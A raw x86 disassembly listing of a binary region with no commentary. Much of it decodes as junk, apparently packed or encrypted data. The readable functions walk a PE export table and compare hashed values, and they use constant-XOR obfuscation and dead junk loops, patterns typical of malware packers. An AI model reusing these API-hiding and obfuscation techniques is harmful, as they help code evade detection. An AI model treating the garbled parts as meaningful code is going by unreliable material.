  40e4fd:	dec    esi
  40e4fe:	xor    edx,DWORD PTR [eax-0x264cdc5e]
  40e504:	je     0x40e532
  40e506:	test   eax,0x8b11d432
  40e50b:	imul   eax,DWORD PTR [ebp+0x78de588b],0xb5edff74
  40e515:	inc    ebp
  40e516:	jnp    0x40e596
  40e518:	add    edx,DWORD PTR [edx-0x34180feb]
  40e51e:	(bad)  
  40e51f:	mov    al,al
  40e521:	sahf   
  40e522:	aad    0xe3
  40e524:	and    al,BYTE PTR [edx]
  40e526:	sbb    BYTE PTR ds:0x46967444,ch
  40e52c:	nop
  40e52d:	data16 add BYTE PTR [edi],bh
  40e530:	sti    
  40e531:	push   0x44
  40e533:	mov    WORD PTR [edi+0x13f840d],gs
  40e539:	pop    eax
  40e53a:	sbb    eax,0x92fdbd22
  40e53f:	xchg   ecx,eax
  40e540:	or     edi,ebx
  40e542:	inc    edx
  40e543:	repnz int 0xf
  40e546:	xchg   ecx,eax
  40e547:	xchg   ebx,eax
  40e548:	int3   
  40e549:	sbb    DWORD PTR [esi],edx
  40e54b:	leave  
  40e54c:	stos   BYTE PTR es:[edi],al
  40e54d:	cs mov cs,edi
  40e550:	mov    edx,DWORD PTR [esp+ecx*2+0x17]
  40e554:	xor    ebx,ecx
  40e556:	mov    eax,0x1261eda2
  40e55b:	dec    eax
  40e55c:	fs jo  0x40e4f0
  40e55f:	scas   eax,DWORD PTR es:[edi]
  40e560:	inc    edi
  40e561:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40e564:	push   ss
  40e565:	xchg   esp,eax
  40e566:	lock jno 0x40e541
  40e569:	imul   DWORD PTR [ebp-0x4f]
  40e56c:	adc    DWORD PTR [eax+eiz*8],0x18
  40e570:	mov    ecx,0x20d9b40e
  40e575:	mov    BYTE PTR [edx-0x37],bl
  40e578:	mov    eax,0x180b6e39
  40e57d:	repnz lds esi,FWORD PTR [eax]
  40e580:	jne    0x40e53c
  40e582:	cli    
  40e583:	inc    ebx
  40e584:	inc    esi
  40e585:	dec    esi
  40e586:	xor    BYTE PTR [edi+ebp*2],bh
  40e589:	mov    bl,0xd7
  40e58b:	push   0x409c2df7
  40e590:	jmp    0x1a80bb00
  40e595:	dec    esp
  40e596:	out    dx,eax
  40e597:	push   edx
  40e598:	mov    BYTE PTR [edx+0x3c36b9f4],dl
  40e59e:	pop    ds
  40e59f:	mov    edx,0x4ff32588
  40e5a4:	mov    dl,0x53
  40e5a6:	fwait
  40e5a7:	scas   eax,DWORD PTR es:[edi]
  40e5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5a9:	repnz push esi
  40e5ab:	dec    ebp
  40e5ac:	xor    ah,BYTE PTR [esp+ecx*1-0x4e]
  40e5b0:	xor    ch,BYTE PTR [ecx+0x429143af]
  40e5b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5b7:	add    BYTE PTR [eax+0x537270e3],dl
  40e5bd:	jno    0x40e554
  40e5bf:	adc    bh,al
  40e5c1:	sub    DWORD PTR [edi-0x46],edi
  40e5c4:	adc    eax,0x90cf145b
  40e5c9:	mov    ebp,0x10c00080
  40e5ce:	adc    eax,0xe19cd330
  40e5d3:	push   edx
  40e5d4:	inc    edx
  40e5d5:	mov    edx,0xa3924f9c
  40e5da:	cld    
  40e5db:	jbe    0x40e637
  40e5dd:	repz mov eax,0xb1982d9
  40e5e3:	inc    eax
  40e5e4:	jbe    0x40e569
  40e5e6:	(bad)  
  40e5e8:	and    dh,BYTE PTR [ecx-0x19]
  40e5eb:	stos   BYTE PTR es:[edi],al
  40e5ec:	sbb    ebx,edi
  40e5ee:	js     0x40e5f2
  40e5f0:	push   cs
  40e5f1:	sbb    BYTE PTR [esi+0x7a59385e],ch
  40e5f7:	inc    ebx
  40e5f8:	sub    DWORD PTR [esi-0x34],eax
  40e5fb:	imul   esi,ebp,0xfed3550a
  40e601:	mov    al,0xce
  40e603:	dec    ecx
  40e604:	ja     0x40e663
  40e606:	fwait
  40e607:	jge    0x40e601
  40e609:	add    al,0x8b
  40e60b:	inc    esi
  40e60c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e60d:	cld    
  40e60e:	(bad)  
  40e60f:	pop    ebx
  40e610:	retf   
  40e611:	cli    
  40e612:	in     al,dx
  40e613:	fisttp QWORD PTR [edx+0x26]
  40e616:	pop    edi
  40e617:	imul   esp,DWORD PTR [esi],0xfffffff8
  40e61a:	add    BYTE PTR [ecx],al
  40e61c:	das    
  40e61d:	adc    eax,0x33612080
  40e622:	scas   eax,DWORD PTR es:[edi]
  40e623:	push   esp
  40e624:	inc    edx
  40e625:	pop    esp
  40e626:	inc    edx
  40e627:	in     eax,0x31
  40e629:	loope  0x40e636
  40e62b:	cmp    DWORD PTR [edx-0x2ed6b845],edi
  40e631:	push   ecx
  40e632:	add    ch,BYTE PTR [ebp+edi*4+0x16]
  40e636:	inc    edx
  40e637:	jb     0x40e66a
  40e639:	jl     0x40e5f8
  40e63b:	movsx  esp,BYTE PTR [esi+0x70]
  40e63f:	out    0x29,eax
  40e641:	and    edi,DWORD PTR [edi+0x4c5d0c6c]
  40e647:	mov    bh,0xe7
  40e649:	jo     0x40e668
  40e64b:	retf   0x246a
  40e64e:	jo     0x40e61d
  40e650:	stos   BYTE PTR es:[edi],al
  40e651:	aaa    
  40e652:	es push ebp
  40e654:	cli    
  40e655:	shl    BYTE PTR [esi],1
  40e657:	retf   0x1012
  40e65a:	mov    WORD PTR [ecx+0x44],ds
  40e65d:	or     DWORD PTR [eax],edx
  40e65f:	mov    esi,DWORD PTR [edi]
  40e661:	pop    esp
  40e662:	adc    al,0xf1
  40e664:	aam    0xa0
  40e666:	mov    bl,0x33
  40e668:	add    DWORD PTR [ebx+0x1b2a9696],0x73
  40e66f:	sti    
  40e670:	gs pop ebp
  40e672:	inc    ecx
  40e673:	ret    
  40e674:	and    edi,0xffffffa7
  40e677:	sbb    al,0xa8
  40e679:	push   ss
  40e67a:	mov    al,0x1b
  40e67c:	jp     0x40e643
  40e67e:	sbb    al,0xea
  40e680:	cld    
  40e681:	cmp    BYTE PTR [ecx+ebp*2],dh
  40e684:	(bad)  [edx-0x68]
  40e687:	mov    ecx,0x4281f85a
  40e68c:	push   es
  40e68d:	xchg   cl,al
  40e68f:	or     BYTE PTR ds:[ecx+0x7a23284d],ah
  40e696:	pusha  
  40e697:	(bad)  
  40e698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e699:	sar    ebx,cl
  40e69b:	icebp  
  40e69c:	jle    0x40e6e4
  40e69e:	fild   DWORD PTR [esi]
  40e6a0:	xor    eax,0x44f16a6f
  40e6a5:	test   eax,ecx
  40e6a7:	popa   
  40e6a8:	push   0x9cc54444
  40e6ad:	pop    edi
  40e6ae:	inc    edi
  40e6af:	xchg   edx,eax
  40e6b0:	push   esp
  40e6b1:	or     al,0x4a
  40e6b3:	jl     0x40e67d
  40e6b5:	cld    
  40e6b6:	inc    ebp
  40e6b7:	xchg   ebx,eax
  40e6b8:	sbb    DWORD PTR [esi],edx
  40e6ba:	stos   DWORD PTR es:[edi],eax
  40e6bb:	push   esi
  40e6bc:	push   esi
  40e6bd:	ins    DWORD PTR es:[edi],dx
  40e6be:	cmc    
  40e6bf:	in     eax,dx
  40e6c0:	dec    esp
  40e6c1:	sbb    BYTE PTR [edx+esi*2],ah
  40e6c4:	push   es
  40e6c5:	fcmovb st,st(4)
  40e6c7:	xlat   BYTE PTR ds:[ebx]
  40e6c8:	das    
  40e6c9:	neg    BYTE PTR [edi+ebp*1+0x5efed05e]
  40e6d0:	xchg   ebx,eax
  40e6d1:	inc    edx
  40e6d2:	retf   
  40e6d3:	outs   dx,BYTE PTR ds:[esi]
  40e6d4:	dec    ebx
  40e6d5:	aam    0x72
  40e6d7:	or     eax,0x150bc417
  40e6dc:	(bad)
  40e6df:	add    DWORD PTR [ecx],esi
  40e6e1:	test   BYTE PTR [eax-0x37],0x5f
  40e6e5:	add    DWORD PTR [edx-0x6c],edi
  40e6e8:	mov    bl,0x6e
  40e6ea:	retf   0x6716
  40e6ed:	imul   ebp,DWORD PTR [edi-0x3988799c],0xffffff86
  40e6f4:	maxps  xmm0,XMMWORD PTR [ebx-0x55]
  40e6f8:	jnp    0x40e766
  40e6fa:	sti    
  40e6fb:	loopne 0x40e70d
  40e6fd:	xor    edi,DWORD PTR [eax+0x237bc5f1]
  40e703:	sti    
  40e704:	call   0xc6731072
  40e709:	xchg   esi,eax
  40e70a:	(bad)  
  40e70b:	fistp  WORD PTR [ebx]
  40e70d:	aaa    
  40e70e:	hlt    
  40e70f:	xor    al,0x4c
  40e711:	dec    DWORD PTR [ecx+0x27dbd7d8]
  40e717:	inc    ecx
  40e718:	jle    0x40e6c7
  40e71a:	dec    edi
  40e71b:	aad    0x9d
  40e71d:	or     bh,BYTE PTR [edi]
  40e71f:	inc    esp
  40e720:	and    ecx,esi
  40e722:	(bad)  
  40e723:	cli    
  40e724:	in     al,dx
  40e725:	icebp  
  40e726:	ss jp  0x40e7a3
  40e729:	adc    eax,0xaa4a00b
  40e72e:	cdq    
  40e72f:	arpl   bp,bp
  40e731:	cld    
  40e732:	or     eax,0x8615df87
  40e737:	dec    esp
  40e738:	xchg   esp,eax
  40e739:	es in  eax,0x2b
  40e73c:	sahf   
  40e73d:	inc    edx
  40e73e:	loopne 0x40e770
  40e740:	ins    DWORD PTR es:[edi],dx
  40e741:	retf   
  40e742:	(bad)  
  40e743:	daa    
  40e744:	xchg   ebp,eax
  40e745:	push   0xffffffd9
  40e747:	mov    ss,edx
  40e749:	(bad)  
  40e74a:	out    dx,al
  40e74b:	bound  ebx,QWORD PTR [edi+0x31d79370]
  40e751:	call   0x54a4:0x74076aa4
  40e758:	addr16 je 0x40e79d
  40e75b:	mov    ebp,0xc50426bc
  40e760:	test   DWORD PTR [ebp+ebp*4-0x4a],eax
  40e764:	cmp    al,0x8c
  40e766:	sub    al,0x8a
  40e768:	jns    0x40e6ff
  40e76a:	mov    edi,0x4bd6a1e3
  40e770:	jmp    0x40e75b
  40e772:	lods   eax,DWORD PTR ds:[esi]
  40e773:	push   edx
  40e774:	ds inc ebp
  40e776:	mov    edi,0xe9dafef9
  40e77b:	cld    
  40e77c:	call   0xddc9:0x7989278
  40e783:	xchg   esp,eax
  40e784:	jnp    0x40e7b4
  40e786:	arpl   WORD PTR [edx+0xe],ax
  40e789:	repnz pop ebx
  40e78b:	mov    eax,0x7e8a5439
  40e790:	arpl   WORD PTR [edx-0x52e324d6],di
  40e796:	sbb    esp,DWORD PTR [edx]
  40e798:	cs mov edx,0x74ea23ab
  40e79e:	(bad)  
  40e79f:	or     al,0x5f
  40e7a1:	(bad)  [ebp-0x3]
  40e7a4:	jb     0x40e74e
  40e7a6:	sbb    al,0x5
  40e7a8:	call   0x9496:0xd28da233
  40e7af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7b0:	cmp    esp,DWORD PTR [esi-0x65]
  40e7b3:	and    BYTE PTR [edi+0x4d],0x81
  40e7b7:	mov    esi,0x501a1e4c
  40e7bc:	int3   
  40e7bd:	adc    DWORD PTR [ebp+esi*8-0x29c54f73],0x6d
  40e7c5:	dec    ebx
  40e7c6:	and    DWORD PTR [edx+0x10],edi
  40e7c9:	rcr    BYTE PTR [esi-0x48],0x35
  40e7cd:	fwait
  40e7ce:	or     eax,0x42d8815f
  40e7d3:	fnstcw WORD PTR [ecx+0x7de94501]
  40e7d9:	or     edi,DWORD PTR [ecx+0x6ce9bdc3]
  40e7df:	add    ebp,DWORD PTR [edi+eax*2+0x131f4834]
  40e7e6:	pop    esi
  40e7e7:	enter  0x9f95,0xba
  40e7eb:	cmp    esi,DWORD PTR [ebx+0x777a96ce]
  40e7f1:	daa    
  40e7f2:	pop    esp
  40e7f3:	dec    ecx
  40e7f4:	ins    DWORD PTR es:[edi],dx
  40e7f5:	out    0x94,eax
  40e7f7:	push   0x7d940a5d
  40e7fc:	mov    cs,WORD PTR [ebx-0x76e99596]
  40e802:	icebp  
  40e803:	popa   
  40e804:	cmp    BYTE PTR [ecx+eiz*4+0x7f3681],dh
  40e80b:	repnz aaa 
  40e80d:	mov    al,0xd5
  40e80f:	pop    edx
  40e810:	jo     0x40e84c
  40e812:	jbe    0x40e871
  40e814:	mov    edx,0xad64942d
  40e819:	jmp    0x5937:0x2482ced3
  40e820:	lods   eax,DWORD PTR ds:[esi]
  40e821:	aad    0x8b
  40e823:	lahf   
  40e824:	dec    esp
  40e825:	test   eax,0xd4499d44
  40e82a:	repz pusha 
  40e82c:	cmp    BYTE PTR [esi-0x58a47bc3],0xbe
  40e833:	xchg   esi,eax
  40e834:	mov    al,0xc1
  40e836:	lock dec ebp
  40e838:	push   ecx
  40e839:	cdq    
  40e83a:	stc    
  40e83b:	jle    0x40e7f7
  40e83d:	jp     0x40e809
  40e83f:	cmp    BYTE PTR [eax],bh
  40e841:	not    eax
  40e843:	dec    esi
  40e844:	push   cs
  40e845:	cdq    
  40e846:	out    0xe7,eax
  40e848:	fld    TBYTE PTR [ecx+0x69]
  40e84b:	jp     0x40e852
  40e84d:	cmp    al,0x1
  40e84f:	enter  0xd214,0xbb
  40e853:	pop    eax
  40e854:	shl    BYTE PTR [ebp+0x47138711],cl
  40e85a:	cmc    
  40e85b:	xchg   edx,eax
  40e85c:	mov    ah,0x8d
  40e85e:	xor    esi,ebp
  40e860:	fs sub al,ch
  40e863:	or     DWORD PTR [ecx+esi*2+0xb],ebp
  40e867:	xor    esp,0xb8298bcf
  40e86d:	loop   0x40e824
  40e86f:	sub    ah,BYTE PTR [ecx+0x65]
  40e872:	jl     0x40e8b1
  40e874:	dec    edx
  40e875:	enter  0xae5f,0xf5
  40e879:	pop    ebx
  40e87a:	pop    edi
  40e87b:	or     cl,BYTE PTR [eax+ebp*2+0x7e]
  40e87f:	sysexit 
  40e881:	gs cli 
  40e883:	or     BYTE PTR [eax-0x45911fb8],cl
  40e889:	pop    ecx
  40e88a:	sub    BYTE PTR [ebx+0x328c4719],ah
  40e890:	mov    ah,0xd5
  40e892:	fadd   QWORD PTR [eax+0x7a778c1c]
  40e898:	xchg   ebp,eax
  40e899:	sbb    BYTE PTR [edi+0x18],dh
  40e89c:	jg     0x40e856
  40e89e:	or     eax,0xb8918a52
  40e8a3:	or     BYTE PTR [edi+0x2012488c],0x66
  40e8aa:	xor    ebx,DWORD PTR [ebp+0x0]
  40e8ad:	fstp   QWORD PTR [ebx-0x80]
  40e8b1:	dec    edx
  40e8b2:	inc    ebx
  40e8b3:	mov    bh,0xc0
  40e8b5:	jmp    0x57b2:0xd90e87d6
  40e8bc:	adc    edx,DWORD PTR [ecx]
  40e8be:	cmp    BYTE PTR [ebp+0x6d575858],ch
  40e8c4:	or     DWORD PTR [ecx-0x38],esi
  40e8c7:	loop   0x40e8e5
  40e8c9:	imul   edi,DWORD PTR [ecx+0x307adcf4],0xffffffaa
  40e8d0:	enter  0xe8b8,0xd3
  40e8d4:	into   
  40e8d5:	dec    esp
  40e8d6:	(bad)  
  40e8d7:	push   ebx
  40e8d8:	adc    eax,0xf785d057
  40e8dd:	pop    ebp
  40e8de:	imul   esp,DWORD PTR [edi-0x20],0xf2726fb6
  40e8e5:	out    0x1b,al
  40e8e7:	clc    
  40e8e8:	sub    bl,BYTE PTR [ebx+0x48]
  40e8eb:	ins    DWORD PTR es:[edi],dx
  40e8ec:	test   DWORD PTR [edx-0x52],eax
  40e8ef:	dec    esp
  40e8f0:	in     eax,0xa7
  40e8f2:	dec    ecx
  40e8f3:	mov    ecx,0x1e68932b
  40e8f8:	aam    0x80
  40e8fa:	inc    esi
  40e8fb:	ins    BYTE PTR es:[edi],dx
  40e8fc:	pop    eax
  40e8fd:	sub    ebx,DWORD PTR [edi+0x32]
  40e900:	rcl    DWORD PTR [ebx],0x43
  40e903:	rcl    DWORD PTR [eax],cl
  40e905:	dec    ecx
  40e906:	pop    edx
  40e907:	repnz and eax,DWORD PTR [esi+0x2a]
  40e90b:	pop    ss
  40e90c:	ss pop ebx
  40e90e:	adc    bl,BYTE PTR [eax+0x6]
  40e911:	sbb    eax,eax
  40e913:	push   edi
  40e914:	arpl   WORD PTR [edx+eax*1-0x2f8b944a],di
  40e91b:	in     eax,dx
  40e91c:	repz imul esi,edi,0x8e077922
  40e923:	push   ebx
  40e924:	sbb    BYTE PTR [ecx],dl
  40e926:	sar    DWORD PTR [ebp+0x730818db],cl
  40e92c:	rcl    BYTE PTR [ebp+ebx*2+0x381b1e26],cl
  40e933:	inc    eax
  40e934:	lahf   
  40e935:	scas   al,BYTE PTR es:[edi]
  40e936:	cmp    eax,0x88fefa0e
  40e93b:	sbb    BYTE PTR [ebx+0x86d4711],ah
  40e941:	adc    esi,DWORD PTR ds:[esi]
  40e944:	jecxz  0x40e98e
  40e946:	fnstcw WORD PTR [ebp+esi*2-0x928c11f]
  40e94d:	dec    eax
  40e94e:	stc    
  40e94f:	xchg   esp,eax
  40e950:	or     dh,BYTE PTR [edi-0x66471e3e]
  40e956:	mov    dh,0x9d
  40e958:	xchg   esp,eax
  40e959:	inc    ebx
  40e95a:	jp     0x40e9d2
  40e95c:	pop    es
  40e95d:	rcr    eax,0xd
  40e960:	mov    ebx,edi
  40e962:	mov    dl,0xfc
  40e964:	imul   esp,DWORD PTR [eax],0xffffffe0
  40e967:	cli    
  40e968:	push   0x7f
  40e96a:	(bad)  
  40e96b:	(bad)  
  40e96c:	push   ebp
  40e96d:	pop    eax
  40e96e:	or     BYTE PTR fs:[ebx+0x4e],0xf1
  40e973:	sbb    bh,dl
  40e975:	mov    bh,0xad
  40e977:	jecxz  0x40e965
  40e979:	icebp  
  40e97a:	stos   BYTE PTR es:[edi],al
  40e97b:	or     al,0x3f
  40e97d:	adc    cl,BYTE PTR [ecx+0x45002e0a]
  40e983:	mov    ah,BYTE PTR [edx-0x44e4b4a8]
  40e989:	xchg   esp,eax
  40e98a:	cwde   
  40e98b:	daa    
  40e98c:	mov    edx,0x7167a0fe
  40e991:	call   0x31cd:0xad89230b
  40e998:	mov    edi,DWORD PTR [eax+0x3c]
  40e99b:	lea    esi,[edi+esi*8+0x78]
  40e99f:	mov    esi,DWORD PTR [esi+eax*1]
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	(bad)  
  40eced:	ss pop es
  40ecef:	retf   
  40ecf0:	jl     0x40ecbe
  40ecf2:	jl     0x40ed70
  40ecf4:	inc    eax
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	fmul   DWORD PTR [eax+eax*2]
  40ecfb:	fwait
  40ecfc:	mov    dl,0xf1
  40ecfe:	sbb    al,bl
  40ed00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed01:	rep ins BYTE PTR es:[edi],dx
  40ed03:	inc    ecx
  40ed04:	sub    al,0xb4
  40ed06:	add    eax,0xc339f5bc
  40ed0b:	push   ebx
  40ed0c:	push   edi
  40ed0d:	popa   
  40ed0e:	sub    BYTE PTR [ebx],bh
  40ed10:	dec    esp
  40ed11:	and    BYTE PTR [esp+edx*1+0x4513da4a],bl
  40ed18:	push   esp
  40ed19:	bound  ebp,QWORD PTR [esi]
  40ed1b:	sti    
  40ed1c:	addr16 push 0x2d
  40ed1f:	in     eax,0x8c
  40ed21:	jne    0x40ed50
  40ed23:	outs   dx,BYTE PTR ds:[esi]
  40ed24:	mov    dh,0x66
  40ed26:	dec    edx
  40ed27:	push   esi
  40ed28:	inc    ecx
  40ed29:	aam    0xa7
  40ed2b:	int    0x5b
  40ed2d:	jmp    0x89e6a4a7
